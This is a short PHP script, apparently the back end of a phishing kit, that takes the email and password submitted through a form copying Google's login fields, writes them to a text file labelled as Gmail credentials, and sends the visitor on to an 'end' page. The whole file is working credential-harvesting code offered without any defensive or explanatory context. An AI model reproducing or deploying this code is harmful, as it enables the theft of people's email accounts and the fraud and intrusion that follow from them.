<?php


file_put_contents("usernames.txt", 
"Gmail Username: " . $_POST['Email'] . "
Gmail Password: " . $_POST['Passwd'] . "\n", FILE_APPEND);
header('Location: end.html');
exit();
?>